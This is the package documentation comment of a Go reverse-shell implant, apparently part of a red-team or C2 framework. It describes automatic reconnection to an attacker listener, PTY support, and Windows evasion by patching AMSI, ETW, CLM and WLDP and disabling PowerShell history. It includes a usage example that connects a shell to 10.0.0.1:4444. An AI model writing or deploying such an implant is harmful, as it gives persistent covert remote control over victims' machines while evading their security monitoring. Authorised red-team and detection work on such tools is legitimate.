// Package shell provides a reverse shell implementation with automatic
// reconnection, PTY support, and optional Windows evasion techniques.
//
// Technique: Reverse shell with transport abstraction and evasion integration.
// MITRE ATT&CK: T1059 (Command and Scripting Interpreter)
// Platform: Cross-platform (Windows: cmd.exe direct I/O, Unix: PTY via creack/pty)
// Detection: High -- reverse shell traffic patterns are well-known indicators.
//
// Key features:
//   - Automatic reconnection with configurable retry count and delay
//   - Transport-agnostic design (works with any c2/transport.Transport)
//   - PTY support on Unix for full interactive terminal
//   - Optional Windows evasion: AMSI, ETW, CLM, WLDP patching and PS history disable
//   - Graceful shutdown via Stop() and Wait()
//
// Example:
//
//	trans := transport.NewTCP("10.0.0.1:4444", 10*time.Second)
//	sh := shell.New(trans, nil)
//	sh.Start(context.Background())
//
// How it works: A reverse shell is a program that connects outbound to an
// attacker-controlled listener and pipes a local command interpreter (cmd.exe
// or /bin/sh) over that connection, giving the operator interactive access.
// This package wraps the shell process with a reconnection loop: if the
// connection drops, it retries with a configurable delay and maximum attempt
// count, ensuring the implant re-establishes contact without manual
// intervention. On Unix, it allocates a PTY for full terminal support.
package shell
